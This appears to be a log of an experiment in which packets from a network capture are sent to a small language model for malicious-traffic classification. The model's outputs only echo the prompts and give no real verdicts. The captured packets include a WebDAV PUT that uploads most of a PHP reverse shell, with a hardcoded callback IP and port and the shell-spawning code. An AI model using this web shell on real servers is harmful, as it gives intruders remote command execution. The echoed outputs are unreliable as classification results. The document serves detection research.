@@ -1,0 +1,362 @@
+Using text-generation model:Ejafa/vicuna_7B_vanilla_1.1
+----------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+        You are an advanced AI that detects malicious requests by parsing the various payloads of the protocols.
+        Please analyze the 32 packets provided in the follow-up prompts 
+        and determine if each packet is malicious or not. 
+        Packet Payload if bigger, will be split into chunks and sent for analysis.
+        Consider examining the payload, headers, and protocols in a step-by-step analysis.
+        Note that an empty payload is not considered malicious.
+        As an AI classifier specialized in detecting malicious activity or network attacks, 
+        you should carefully examine the payload and follow a step-by-step analysis.
+        If even One of the packet is malicious , mark the whole pcap file as malicious.
+        The prompt for each packet will be provided after this instruction.
+    
+
+
+Result from the packet file:[{'generated_text': '\n        You are an advanced AI that detects malicious requests by parsing the various payloads of the protocols.\n        Please analyze the 32 packets provided in the follow-up prompts \n        and determine if each packet is malicious or not. \n        Packet Payload if bigger, will be split into chunks and sent for analysis.\n        Consider examining the payload, headers, and protocols in a step-by-step analysis.\n        Note that an empty payload is not considered malicious.\n        As an AI classifier specialized in detecting malicious activity or network attacks, \n        you should carefully examine the payload and follow a step-by-step analysis.\n        If even One of the packet is malicious , mark the whole pcap file as malicious.\n        The prompt for each packet will be provided after this instruction.\n    \n'}]
+----------------------------------------------------------------------------------------------------------------------------------------------------------------
+----------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+    Packet: 0
+    Protocol: IP
+    Payload: <IP  version=4 ihl=5 tos=0x0 len=60 id=44555 flags=DF frag=0 ttl=64 proto=tcp chksum=0xa4d src=192.168.0.154 dst=192.168.0.121 |<TCP  sport=44392 dport=http seq=3940392180 ack=0 dataofs=10 reserved=0 flags=S window=64240 chksum=0x8292 urgptr=0 options=[('MSS', 1460), ('SAckOK', b''), ('Timestamp', (975651441, 0)), ('NOP', None), ('WScale', 7)] |>>
+    
+
+
+Result from the packet file:[{'generated_text': "\n    Packet: 0\n    Protocol: IP\n    Payload: <IP  version=4 ihl=5 tos=0x0 len=60 id=44555 flags=DF frag=0 ttl=64 proto=tcp chksum=0xa4d src=192.168.0.154 dst=192.168.0.121 |<TCP  sport=44392 dport=http seq=3940392180 ack=0 dataofs=10 reserved=0 flags=S window=64240 chksum=0x8292 urgptr=0 options=[('MSS', 1460), ('SAckOK', b''), ('Timestamp', (975651441, 0)), ('NOP', None), ('WScale', 7)] |>>\n    \n"}]
+----------------------------------------------------------------------------------------------------------------------------------------------------------------
+----------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+    Packet: 1
+    Protocol: IP
+    Payload: <IP  version=4 ihl=5 tos=0x0 len=52 id=44556 flags=DF frag=0 ttl=64 proto=tcp chksum=0xa54 src=192.168.0.154 dst=192.168.0.121 |<TCP  sport=44392 dport=http seq=3940392181 ack=741302054 dataofs=8 reserved=0 flags=A window=502 chksum=0x828a urgptr=0 options=[('NOP', None), ('NOP', None), ('Timestamp', (975651442, 6175878))] |>>
+    
+
+
+Result from the packet file:[{'generated_text': "\n    Packet: 1\n    Protocol: IP\n    Payload: <IP  version=4 ihl=5 tos=0x0 len=52 id=44556 flags=DF frag=0 ttl=64 proto=tcp chksum=0xa54 src=192.168.0.154 dst=192.168.0.121 |<TCP  sport=44392 dport=http seq=3940392181 ack=741302054 dataofs=8 reserved=0 flags=A window=502 chksum=0x828a urgptr=0 options=[('NOP', None), ('NOP', None), ('Timestamp', (975651442, 6175878))] |>>\n    \n"}]
+----------------------------------------------------------------------------------------------------------------------------------------------------------------
+----------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+    Packet: 2
+    Protocol: IP
+    Payload: <IP  version=4 ihl=5 tos=0x0 len=332 id=44557 flags=DF frag=0 ttl=64 proto=tcp chksum=0x93b src=192.168.0.154 dst=192.168.0.121 |<TCP  sport=44392 dport=http seq=3940392181 ack=741302054 dataofs=8 reserved=0 flags=PA window=502 chksum=0x83a2 urgptr=0 options=[('NOP', None), ('NOP', None), ('Timestamp', (975651476, 6175878))] |<Raw  load='PROPFIND /uploads/ HTTP/1.1\r\nTE: deflate,gzip;q=0.3\r\nConnection: TE, close\r\nHost: 192.168.0.121:80\r\nUser-Agent: dave/v2.01 (perldav)\r\nContent-Length: 90\r\nContent-Type: text/xml\r\nDepth: 0\r\n\r\n<?xml version="1.0" encoding="utf-8"?><D:propfind xmlns:D="DAV:"><D:allprop/></D:propfind>' |>>>
+    
+
+
+Result from the packet file:[{'generated_text': '\n    Packet: 2\n    Protocol: IP\n    Payload: <IP  version=4 ihl=5 tos=0x0 len=332 id=44557 flags=DF frag=0 ttl=64 proto=tcp chksum=0x93b src=192.168.0.154 dst=192.168.0.121 |<TCP  sport=44392 dport=http seq=3940392181 ack=741302054 dataofs=8 reserved=0 flags=PA window=502 chksum=0x83a2 urgptr=0 options=[(\'NOP\', None), (\'NOP\', None), (\'Timestamp\', (975651476, 6175878))] |<Raw  load=\'PROPFIND /uploads/ HTTP/1.1\\r\\nTE: deflate,gzip;q=0.3\\r\\nConnection: TE, close\\r\\nHost: 192.168.0.121:80\\r\\nUser-Agent: dave/v2.01 (perldav)\\r\\nContent-Length: 90\\r\\nContent-Type: text/xml\\r\\nDepth: 0\\r\\n\\r\\n<?xml version="1.0" encoding="utf-8"?><D:propfind xmlns:D="DAV:"><D:allprop/></D:propfind>\' |>>>\n    \n'}]
+----------------------------------------------------------------------------------------------------------------------------------------------------------------
+----------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+    Packet: 3
+    Protocol: IP
+    Payload: <IP  version=4 ihl=5 tos=0x0 len=52 id=44558 flags=DF frag=0 ttl=64 proto=tcp chksum=0xa52 src=192.168.0.154 dst=192.168.0.121 |<TCP  sport=44392 dport=http seq=3940392461 ack=741303088 dataofs=8 reserved=0 flags=A window=501 chksum=0x828a urgptr=0 options=[('NOP', None), ('NOP', None), ('Timestamp', (975651477, 6175887))] |>>
+    
+
+
+Result from the packet file:[{'generated_text': "\n    Packet: 3\n    Protocol: IP\n    Payload: <IP  version=4 ihl=5 tos=0x0 len=52 id=44558 flags=DF frag=0 ttl=64 proto=tcp chksum=0xa52 src=192.168.0.154 dst=192.168.0.121 |<TCP  sport=44392 dport=http seq=3940392461 ack=741303088 dataofs=8 reserved=0 flags=A window=501 chksum=0x828a urgptr=0 options=[('NOP', None), ('NOP', None), ('Timestamp', (975651477, 6175887))] |>>\n    \n"}]
+----------------------------------------------------------------------------------------------------------------------------------------------------------------
+----------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+    Packet: 4
+    Protocol: IP
+    Payload: <IP  version=4 ihl=5 tos=0x0 len=52 id=44559 flags=DF frag=0 ttl=64 proto=tcp chksum=0xa51 src=192.168.0.154 dst=192.168.0.121 |<TCP  sport=44392 dport=http seq=3940392461 ack=741303089 dataofs=8 reserved=0 flags=FA window=501 chksum=0x828a urgptr=0 options=[('NOP', None), ('NOP', None), ('Timestamp', (975651479, 6175887))] |>>
+    
+
+
+Result from the packet file:[{'generated_text': "\n    Packet: 4\n    Protocol: IP\n    Payload: <IP  version=4 ihl=5 tos=0x0 len=52 id=44559 flags=DF frag=0 ttl=64 proto=tcp chksum=0xa51 src=192.168.0.154 dst=192.168.0.121 |<TCP  sport=44392 dport=http seq=3940392461 ack=741303089 dataofs=8 reserved=0 flags=FA window=501 chksum=0x828a urgptr=0 options=[('NOP', None), ('NOP', None), ('Timestamp', (975651479, 6175887))] |>>\n    \n"}]
+----------------------------------------------------------------------------------------------------------------------------------------------------------------
+----------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+    Packet: 5
+    Protocol: IP
+    Payload: <IP  version=4 ihl=5 tos=0x0 len=60 id=62342 flags=DF frag=0 ttl=64 proto=tcp chksum=0xc4d1 src=192.168.0.154 dst=192.168.0.121 |<TCP  sport=44404 dport=http seq=3310901991 ack=0 dataofs=10 reserved=0 flags=S window=64240 chksum=0x8292 urgptr=0 options=[('MSS', 1460), ('SAckOK', b''), ('Timestamp', (975655197, 0)), ('NOP', None), ('WScale', 7)] |>>
+    
+
+
+Result from the packet file:[{'generated_text': "\n    Packet: 5\n    Protocol: IP\n    Payload: <IP  version=4 ihl=5 tos=0x0 len=60 id=62342 flags=DF frag=0 ttl=64 proto=tcp chksum=0xc4d1 src=192.168.0.154 dst=192.168.0.121 |<TCP  sport=44404 dport=http seq=3310901991 ack=0 dataofs=10 reserved=0 flags=S window=64240 chksum=0x8292 urgptr=0 options=[('MSS', 1460), ('SAckOK', b''), ('Timestamp', (975655197, 0)), ('NOP', None), ('WScale', 7)] |>>\n    \n"}]
+----------------------------------------------------------------------------------------------------------------------------------------------------------------
+----------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+    Packet: 6
+    Protocol: IP
+    Payload: <IP  version=4 ihl=5 tos=0x0 len=52 id=62343 flags=DF frag=0 ttl=64 proto=tcp chksum=0xc4d8 src=192.168.0.154 dst=192.168.0.121 |<TCP  sport=44404 dport=http seq=3310901992 ack=425535277 dataofs=8 reserved=0 flags=A window=502 chksum=0x828a urgptr=0 options=[('NOP', None), ('NOP', None), ('Timestamp', (975655197, 6176817))] |>>
+    
+
+
+Result from the packet file:[{'generated_text': "\n    Packet: 6\n    Protocol: IP\n    Payload: <IP  version=4 ihl=5 tos=0x0 len=52 id=62343 flags=DF frag=0 ttl=64 proto=tcp chksum=0xc4d8 src=192.168.0.154 dst=192.168.0.121 |<TCP  sport=44404 dport=http seq=3310901992 ack=425535277 dataofs=8 reserved=0 flags=A window=502 chksum=0x828a urgptr=0 options=[('NOP', None), ('NOP', None), ('Timestamp', (975655197, 6176817))] |>>\n    \n"}]
+----------------------------------------------------------------------------------------------------------------------------------------------------------------
+----------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+    Packet: 7
+    Protocol: IP
+    Payload: <IP  version=4 ihl=5 tos=0x0 len=332 id=62344 flags=DF frag=0 ttl=64 proto=tcp chksum=0xc3bf src=192.168.0.154 dst=192.168.0.121 |<TCP  sport=44404 dport=http seq=3310901992 ack=425535277 dataofs=8 reserved=0 flags=PA window=502 chksum=0x83a2 urgptr=0 options=[('NOP', None), ('NOP', None), ('Timestamp', (975655198, 6176817))] |<Raw  load='PROPFIND /uploads/ HTTP/1.1\r\nTE: deflate,gzip;q=0.3\r\nConnection: TE, close\r\nHost: 192.168.0.121:80\r\nUser-Agent: dave/v2.01 (perldav)\r\nContent-Length: 90\r\nContent-Type: text/xml\r\nDepth: 0\r\n\r\n<?xml version="1.0" encoding="utf-8"?><D:propfind xmlns:D="DAV:"><D:allprop/></D:propfind>' |>>>
+    
+
+
+Result from the packet file:[{'generated_text': '\n    Packet: 7\n    Protocol: IP\n    Payload: <IP  version=4 ihl=5 tos=0x0 len=332 id=62344 flags=DF frag=0 ttl=64 proto=tcp chksum=0xc3bf src=192.168.0.154 dst=192.168.0.121 |<TCP  sport=44404 dport=http seq=3310901992 ack=425535277 dataofs=8 reserved=0 flags=PA window=502 chksum=0x83a2 urgptr=0 options=[(\'NOP\', None), (\'NOP\', None), (\'Timestamp\', (975655198, 6176817))] |<Raw  load=\'PROPFIND /uploads/ HTTP/1.1\\r\\nTE: deflate,gzip;q=0.3\\r\\nConnection: TE, close\\r\\nHost: 192.168.0.121:80\\r\\nUser-Agent: dave/v2.01 (perldav)\\r\\nContent-Length: 90\\r\\nContent-Type: text/xml\\r\\nDepth: 0\\r\\n\\r\\n<?xml version="1.0" encoding="utf-8"?><D:propfind xmlns:D="DAV:"><D:allprop/></D:propfind>\' |>>>\n    \n'}]
+----------------------------------------------------------------------------------------------------------------------------------------------------------------
+----------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+    Packet: 8
+    Protocol: IP
+    Payload: <IP  version=4 ihl=5 tos=0x0 len=52 id=62345 flags=DF frag=0 ttl=64 proto=tcp chksum=0xc4d6 src=192.168.0.154 dst=192.168.0.121 |<TCP  sport=44404 dport=http seq=3310902272 ack=425536311 dataofs=8 reserved=0 flags=A window=501 chksum=0x828a urgptr=0 options=[('NOP', None), ('NOP', None), ('Timestamp', (975655202, 6176818))] |>>
+    
+
+
+Result from the packet file:[{'generated_text': "\n    Packet: 8\n    Protocol: IP\n    Payload: <IP  version=4 ihl=5 tos=0x0 len=52 id=62345 flags=DF frag=0 ttl=64 proto=tcp chksum=0xc4d6 src=192.168.0.154 dst=192.168.0.121 |<TCP  sport=44404 dport=http seq=3310902272 ack=425536311 dataofs=8 reserved=0 flags=A window=501 chksum=0x828a urgptr=0 options=[('NOP', None), ('NOP', None), ('Timestamp', (975655202, 6176818))] |>>\n    \n"}]
+----------------------------------------------------------------------------------------------------------------------------------------------------------------
+----------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+    Packet: 9
+    Protocol: IP
+    Payload: <IP  version=4 ihl=5 tos=0x0 len=52 id=62346 flags=DF frag=0 ttl=64 proto=tcp chksum=0xc4d5 src=192.168.0.154 dst=192.168.0.121 |<TCP  sport=44404 dport=http seq=3310902272 ack=425536312 dataofs=8 reserved=0 flags=FA window=501 chksum=0x828a urgptr=0 options=[('NOP', None), ('NOP', None), ('Timestamp', (975655203, 6176818))] |>>
+    
+
+
+Result from the packet file:[{'generated_text': "\n    Packet: 9\n    Protocol: IP\n    Payload: <IP  version=4 ihl=5 tos=0x0 len=52 id=62346 flags=DF frag=0 ttl=64 proto=tcp chksum=0xc4d5 src=192.168.0.154 dst=192.168.0.121 |<TCP  sport=44404 dport=http seq=3310902272 ack=425536312 dataofs=8 reserved=0 flags=FA window=501 chksum=0x828a urgptr=0 options=[('NOP', None), ('NOP', None), ('Timestamp', (975655203, 6176818))] |>>\n    \n"}]
+----------------------------------------------------------------------------------------------------------------------------------------------------------------
+----------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+    Packet: 10
+    Protocol: IP
+    Payload: <IP  version=4 ihl=5 tos=0x0 len=60 id=11186 flags=DF frag=0 ttl=64 proto=tcp chksum=0x8ca6 src=192.168.0.154 dst=192.168.0.121 |<TCP  sport=44410 dport=http seq=2533302204 ack=0 dataofs=10 reserved=0 flags=S window=64240 chksum=0x8292 urgptr=0 options=[('MSS', 1460), ('SAckOK', b''), ('Timestamp', (975655208, 0)), ('NOP', None), ('WScale', 7)] |>>
+    
+
+
+Result from the packet file:[{'generated_text': "\n    Packet: 10\n    Protocol: IP\n    Payload: <IP  version=4 ihl=5 tos=0x0 len=60 id=11186 flags=DF frag=0 ttl=64 proto=tcp chksum=0x8ca6 src=192.168.0.154 dst=192.168.0.121 |<TCP  sport=44410 dport=http seq=2533302204 ack=0 dataofs=10 reserved=0 flags=S window=64240 chksum=0x8292 urgptr=0 options=[('MSS', 1460), ('SAckOK', b''), ('Timestamp', (975655208, 0)), ('NOP', None), ('WScale', 7)] |>>\n    \n"}]
+----------------------------------------------------------------------------------------------------------------------------------------------------------------
+----------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+    Packet: 11
+    Protocol: IP
+    Payload: <IP  version=4 ihl=5 tos=0x0 len=52 id=11187 flags=DF frag=0 ttl=64 proto=tcp chksum=0x8cad src=192.168.0.154 dst=192.168.0.121 |<TCP  sport=44410 dport=http seq=2533302205 ack=3057699580 dataofs=8 reserved=0 flags=A window=502 chksum=0x828a urgptr=0 options=[('NOP', None), ('NOP', None), ('Timestamp', (975655209, 6176820))] |>>
+    
+
+
+Result from the packet file:[{'generated_text': "\n    Packet: 11\n    Protocol: IP\n    Payload: <IP  version=4 ihl=5 tos=0x0 len=52 id=11187 flags=DF frag=0 ttl=64 proto=tcp chksum=0x8cad src=192.168.0.154 dst=192.168.0.121 |<TCP  sport=44410 dport=http seq=2533302205 ack=3057699580 dataofs=8 reserved=0 flags=A window=502 chksum=0x828a urgptr=0 options=[('NOP', None), ('NOP', None), ('Timestamp', (975655209, 6176820))] |>>\n    \n"}]
+----------------------------------------------------------------------------------------------------------------------------------------------------------------
+----------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+    As the payload is large, we will split the payload into 8 parts.
+    Here is part 1 of the payload,Do not provide explanation, Only respond if its Malicious or Not-Malicious.:
+    Protocol: IP
+    Payload: <IP  version=4 ihl=5 tos=0x0 len=5709 id=11188 flags=DF frag=0 ttl=64 proto=tcp chksum=0x7693 src=192.168.0.154 dst=192.168.0.121 |<TCP  sport=44410 dport=http seq=2533302205 ack=3057699580 dataofs=8 reserved=0 flags=PA window=502 chksum=0x98a3 urgptr=0 options=[('NOP', None), ('NOP', None), ('Timestamp', (975655210, 6176820))] |<Raw  load='PUT /uploads/shell.php HTTP/1.1\r\nTE: deflate,gzip;q=0.3\r\nConnection: TE, close\r\nHost: 192.168.0.121:80\r\nUser-Agent: dave/v2.01 (perldav)\r\nContent-Length: 5495\r\n\r\n<?php\n// php-reverse-shell - A Reverse Shell implementation in PHP\n// Copyright (C) 2007 pentestmonkey@pentestmonkey.net\n//\n// This tool may be used for legal purposes only.  Users take full responsibility\n// for any actions performed using this tool.  The author accepts no l
+    Packet: 12
+    
+
+
+Result from the packet file:[{'generated_text': "\n    As the payload is large, we will split the payload into 8 parts.\n    Here is part 1 of the payload,Do not provide explanation, Only respond if its Malicious or Not-Malicious.:\n    Protocol: IP\n    Payload: <IP  version=4 ihl=5 tos=0x0 len=5709 id=11188 flags=DF frag=0 ttl=64 proto=tcp chksum=0x7693 src=192.168.0.154 dst=192.168.0.121 |<TCP  sport=44410 dport=http seq=2533302205 ack=3057699580 dataofs=8 reserved=0 flags=PA window=502 chksum=0x98a3 urgptr=0 options=[('NOP', None), ('NOP', None), ('Timestamp', (975655210, 6176820))] |<Raw  load='PUT /uploads/shell.php HTTP/1.1\\r\\nTE: deflate,gzip;q=0.3\\r\\nConnection: TE, close\\r\\nHost: 192.168.0.121:80\\r\\nUser-Agent: dave/v2.01 (perldav)\\r\\nContent-Length: 5495\\r\\n\\r\\n<?php\\n// php-reverse-shell - A Reverse Shell implementation in PHP\\n// Copyright (C) 2007 pentestmonkey@pentestmonkey.net\\n//\\n// This tool may be used for legal purposes only.  Users take full responsibility\\n// for any actions performed using this tool.  The author accepts no l\n    Packet: 12\n    \n"}]
+----------------------------------------------------------------------------------------------------------------------------------------------------------------
+----------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+    As the payload is large, we will split the payload into 8 parts.
+    Here is part 2 of the payload,Do not provide explanation, Only respond if its Malicious or Not-Malicious.:
+    Protocol: IP
+    Payload: iability\n// for damage caused by this tool.  If these terms are not acceptable to you, then\n// do not use this tool.\n//\n// In all other respects the GPL version 2 applies:\n//\n// This program is free software; you can redistribute it and/or modify\n// it under the terms of the GNU General Public License version 2 as\n// published by the Free Software Foundation.\n//\n// This program is distributed in the hope that it will be useful,\n// but WITHOUT ANY WARRANTY; without even the implied warranty of\n// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the\n// GNU General Public License for more details.\n//\n// You should have received a copy of the GNU General Public License along\n// with this program; if not, write to the Free Software Foundation, Inc.,\n// 51 Franklin Stre
+    Packet: 12
+    
+
+
+Result from the packet file:[{'generated_text': '\n    As the payload is large, we will split the payload into 8 parts.\n    Here is part 2 of the payload,Do not provide explanation, Only respond if its Malicious or Not-Malicious.:\n    Protocol: IP\n    Payload: iability\\n// for damage caused by this tool.  If these terms are not acceptable to you, then\\n// do not use this tool.\\n//\\n// In all other respects the GPL version 2 applies:\\n//\\n// This program is free software; you can redistribute it and/or modify\\n// it under the terms of the GNU General Public License version 2 as\\n// published by the Free Software Foundation.\\n//\\n// This program is distributed in the hope that it will be useful,\\n// but WITHOUT ANY WARRANTY; without even the implied warranty of\\n// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the\\n// GNU General Public License for more details.\\n//\\n// You should have received a copy of the GNU General Public License along\\n// with this program; if not, write to the Free Software Foundation, Inc.,\\n// 51 Franklin Stre\n    Packet: 12\n    0'}]
+----------------------------------------------------------------------------------------------------------------------------------------------------------------
+----------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+    As the payload is large, we will split the payload into 8 parts.
+    Here is part 3 of the payload,Do not provide explanation, Only respond if its Malicious or Not-Malicious.:
+    Protocol: IP
+    Payload: et, Fifth Floor, Boston, MA 02110-1301 USA.\n//\n// This tool may be used for legal purposes only.  Users take full responsibility\n// for any actions performed using this tool.  If these terms are not acceptable to\n// you, then do not use this tool.\n//\n// You are encouraged to send comments, improvements or suggestions to\n// me at pentestmonkey@pentestmonkey.net\n//\n// Description\n// -----------\n// This script will make an outbound TCP connection to a hardcoded IP and port.\n// The recipient will be given a shell running as the current user (apache normally).\n//\n// Limitations\n// -----------\n// proc_open and stream_set_blocking require PHP version 4.3+, or 5+\n// Use of stream_select() on file descriptors returned by proc_open() will fail and return FALSE under Windows.\n// Som
+    Packet: 12
+    
+
+
+Result from the packet file:[{'generated_text': '\n    As the payload is large, we will split the payload into 8 parts.\n    Here is part 3 of the payload,Do not provide explanation, Only respond if its Malicious or Not-Malicious.:\n    Protocol: IP\n    Payload: et, Fifth Floor, Boston, MA 02110-1301 USA.\\n//\\n// This tool may be used for legal purposes only.  Users take full responsibility\\n// for any actions performed using this tool.  If these terms are not acceptable to\\n// you, then do not use this tool.\\n//\\n// You are encouraged to send comments, improvements or suggestions to\\n// me at pentestmonkey@pentestmonkey.net\\n//\\n// Description\\n// -----------\\n// This script will make an outbound TCP connection to a hardcoded IP and port.\\n// The recipient will be given a shell running as the current user (apache normally).\\n//\\n// Limitations\\n// -----------\\n// proc_open and stream_set_blocking require PHP version 4.3+, or 5+\\n// Use of stream_select() on file descriptors returned by proc_open() will fail and return FALSE under Windows.\\n// Som\n    Packet: 12\n    \n'}]
+----------------------------------------------------------------------------------------------------------------------------------------------------------------
+----------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+    As the payload is large, we will split the payload into 8 parts.
+    Here is part 4 of the payload,Do not provide explanation, Only respond if its Malicious or Not-Malicious.:
+    Protocol: IP
+    Payload: e compile-time options are needed for daemonisation (like pcntl, posix).  These are rarely available.\n//\n// Usage\n// -----\n// See http://pentestmonkey.net/tools/php-reverse-shell if you get stuck.\n\nset_time_limit (0);\n$VERSION = "1.0";\n$ip = \'192.168.0.154\';  // CHANGE THIS\n$port = 1234;       // CHANGE THIS\n$chunk_size = 1400;\n$write_a = null;\n$error_a = null;\n$shell = \'uname -a; w; id; /bin/sh -i\';\n$daemon = 0;\n$debug = 0;\n\n//\n// Daemonise ourself if possible to avoid zombies later\n//\n\n// pcntl_fork is hardly ever available, but will allow us to daemonise\n// our php process and avoid zombies.  Worth a try...\nif (function_exists(\'pcntl_fork\')) {\n\t// Fork and have the parent process exit\n\t$pid = pcntl_fork();\n\t\n\tif ($pid == -1) {\n\t\tprintit("ERROR: Ca
+    Packet: 12
+    
+
+
+Result from the packet file:[{'generated_text': '\n    As the payload is large, we will split the payload into 8 parts.\n    Here is part 4 of the payload,Do not provide explanation, Only respond if its Malicious or Not-Malicious.:\n    Protocol: IP\n    Payload: e compile-time options are needed for daemonisation (like pcntl, posix).  These are rarely available.\\n//\\n// Usage\\n// -----\\n// See http://pentestmonkey.net/tools/php-reverse-shell if you get stuck.\\n\\nset_time_limit (0);\\n$VERSION = "1.0";\\n$ip = \\\'192.168.0.154\\\';  // CHANGE THIS\\n$port = 1234;       // CHANGE THIS\\n$chunk_size = 1400;\\n$write_a = null;\\n$error_a = null;\\n$shell = \\\'uname -a; w; id; /bin/sh -i\\\';\\n$daemon = 0;\\n$debug = 0;\\n\\n//\\n// Daemonise ourself if possible to avoid zombies later\\n//\\n\\n// pcntl_fork is hardly ever available, but will allow us to daemonise\\n// our php process and avoid zombies.  Worth a try...\\nif (function_exists(\\\'pcntl_fork\\\')) {\\n\\t// Fork and have the parent process exit\\n\\t$pid = pcntl_fork();\\n\\t\\n\\tif ($pid == -1) {\\n\\t\\tprintit("ERROR: Ca\n    Packet: 12\n    \n'}]
+----------------------------------------------------------------------------------------------------------------------------------------------------------------
+----------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+    As the payload is large, we will split the payload into 8 parts.
+    Here is part 5 of the payload,Do not provide explanation, Only respond if its Malicious or Not-Malicious.:
+    Protocol: IP
+    Payload: n\'t fork");\n\t\texit(1);\n\t}\n\t\n\tif ($pid) {\n\t\texit(0);  // Parent exits\n\t}\n\n\t// Make the current process a session leader\n\t// Will only succeed if we forked\n\tif (posix_setsid() == -1) {\n\t\tprintit("Error: Can\'t setsid()");\n\t\texit(1);\n\t}\n\n\t$daemon = 1;\n} else {\n\tprintit("WARNING: Failed to daemonise.  This is quite common and not fatal.");\n}\n\n// Change to a safe directory\nchdir("/");\n\n// Remove any umask we inherited\numask(0);\n\n//\n// Do the reverse shell...\n//\n\n// Open reverse connection\n$sock = fsockopen($ip, $port, $errno, $errstr, 30);\nif (!$sock) {\n\tprintit("$errstr ($errno)");\n\texit(1);\n}\n\n// Spawn shell process\n$descriptorspec = array(\n   0 => array("pipe", "r"),  // stdin is a pipe that the child will read from\n   1 => array("
+    Packet: 12
+    
+
+
+Result from the packet file:[{'generated_text': '\n    As the payload is large, we will split the payload into 8 parts.\n    Here is part 5 of the payload,Do not provide explanation, Only respond if its Malicious or Not-Malicious.:\n    Protocol: IP\n    Payload: n\\\'t fork");\\n\\t\\texit(1);\\n\\t}\\n\\t\\n\\tif ($pid) {\\n\\t\\texit(0);  // Parent exits\\n\\t}\\n\\n\\t// Make the current process a session leader\\n\\t// Will only succeed if we forked\\n\\tif (posix_setsid() == -1) {\\n\\t\\tprintit("Error: Can\\\'t setsid()");\\n\\t\\texit(1);\\n\\t}\\n\\n\\t$daemon = 1;\\n} else {\\n\\tprintit("WARNING: Failed to daemonise.  This is quite common and not fatal.");\\n}\\n\\n// Change to a safe directory\\nchdir("/");\\n\\n// Remove any umask we inherited\\numask(0);\\n\\n//\\n// Do the reverse shell...\\n//\\n\\n// Open reverse connection\\n$sock = fsockopen($ip, $port, $errno, $errstr, 30);\\nif (!$sock) {\\n\\tprintit("$errstr ($errno)");\\n\\texit(1);\\n}\\n\\n// Spawn shell process\\n$descriptorspec = array(\\n   0 => array("pipe", "r"),  // stdin is a pipe that the child will read from\\n   1 => array("\n    Packet: 12\n    0'}]
+----------------------------------------------------------------------------------------------------------------------------------------------------------------
+----------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+    As the payload is large, we will split the payload into 8 parts.
+    Here is part 6 of the payload,Do not provide explanation, Only respond if its Malicious or Not-Malicious.:
+    Protocol: IP
+    Payload: pipe", "w"),  // stdout is a pipe that the child will write to\n   2 => array("pipe", "w")   // stderr is a pipe that the child will write to\n);\n\n$process = proc_open($shell, $descriptorspec, $pipes);\n\nif (!is_resource($process)) {\n\tprintit("ERROR: Can\'t spawn shell");\n\texit(1);\n}\n\n// Set everything to non-blocking\n// Reason: Occsionally reads will block, even though stream_select tells us they won\'t\nstream_set_blocking($pipes[0], 0);\nstream_set_blocking($pipes[1], 0);\nstream_set_blocking($pipes[2], 0);\nstream_set_blocking($sock, 0);\n\nprintit("Successfully opened reverse shell to $ip:$port");\n\nwhile (1) {\n\t// Check for end of TCP connection\n\tif (feof($sock)) {\n\t\tprintit("ERROR: Shell connection terminated");\n\t\tbreak;\n\t}\n\n\t// Check for end of STDOUT\n\t
+    Packet: 12
+    
+
+
+Result from the packet file:[{'generated_text': '\n    As the payload is large, we will split the payload into 8 parts.\n    Here is part 6 of the payload,Do not provide explanation, Only respond if its Malicious or Not-Malicious.:\n    Protocol: IP\n    Payload: pipe", "w"),  // stdout is a pipe that the child will write to\\n   2 => array("pipe", "w")   // stderr is a pipe that the child will write to\\n);\\n\\n$process = proc_open($shell, $descriptorspec, $pipes);\\n\\nif (!is_resource($process)) {\\n\\tprintit("ERROR: Can\\\'t spawn shell");\\n\\texit(1);\\n}\\n\\n// Set everything to non-blocking\\n// Reason: Occsionally reads will block, even though stream_select tells us they won\\\'t\\nstream_set_blocking($pipes[0], 0);\\nstream_set_blocking($pipes[1], 0);\\nstream_set_blocking($pipes[2], 0);\\nstream_set_blocking($sock, 0);\\n\\nprintit("Successfully opened reverse shell to $ip:$port");\\n\\nwhile (1) {\\n\\t// Check for end of TCP connection\\n\\tif (feof($sock)) {\\n\\t\\tprintit("ERROR: Shell connection terminated");\\n\\t\\tbreak;\\n\\t}\\n\\n\\t// Check for end of STDOUT\\n\\t\n    Packet: 12\n    0'}]
+----------------------------------------------------------------------------------------------------------------------------------------------------------------
+----------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+    As the payload is large, we will split the payload into 8 parts.
+    Here is part 7 of the payload,Do not provide explanation, Only respond if its Malicious or Not-Malicious.:
+    Protocol: IP
+    Payload: if (feof($pipes[1])) {\n\t\tprintit("ERROR: Shell process terminated");\n\t\tbreak;\n\t}\n\n\t// Wait until a command is end down $sock, or some\n\t// command output is available on STDOUT or STDERR\n\t$read_a = array($sock, $pipes[1], $pipes[2]);\n\t$num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);\n\n\t// If we can read from the TCP socket, send\n\t// data to process\'s STDIN\n\tif (in_array($sock, $read_a)) {\n\t\tif ($debug) printit("SOCK READ");\n\t\t$input = fread($sock, $chunk_size);\n\t\tif ($debug) printit("SOCK: $input");\n\t\tfwrite($pipes[0], $input);\n\t}\n\n\t// If we can read from the process\'s STDOUT\n\t// send data down tcp connection\n\tif (in_array($pipes[1], $read_a)) {\n\t\tif ($debug) printit("STDOUT READ");\n\t\t$input = fread($pipes[1], $chun
+    Packet: 12
+    
+
+
